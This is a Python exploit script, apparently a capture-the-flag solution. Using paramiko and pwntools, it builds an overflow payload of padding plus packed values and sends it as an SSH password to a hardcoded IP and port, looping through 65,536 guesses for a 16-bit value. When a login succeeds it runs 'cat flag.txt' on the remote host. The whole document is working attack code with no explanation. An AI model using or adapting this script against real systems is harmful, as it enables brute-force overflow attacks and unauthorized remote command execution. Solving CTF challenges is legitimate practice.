import paramiko
from pwn import *

for v17 in range(0xFFFF, -1, -1):

    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    payload  = b"a" * 100
    payload += p32(0xADC29EC3)
    payload += p16(v17)
    payload += p16(0xAFC3)
    payload += b'\x00'

    try:
        cli.connect(
            hostname='34.89.226.167',
            port=30266,
            username='sshuser',
            password=payload,
            timeout=0.3,
            banner_timeout=0.3,
            auth_timeout=0.3,
            allow_agent=False,
            look_for_keys=False
        )

        print(f"v17 = {hex(v17)}")

        stdin, stdout, stderr = cli.exec_command("cat flag.txt")
        print(stdout.read().decode())

        cli.close()
        break  

    except paramiko.ssh_exception.AuthenticationException:
        pass
    except Exception:
        pass

    cli.close()

    if v17 % 256 == 0:
        print(f"tried {hex(v17)}")
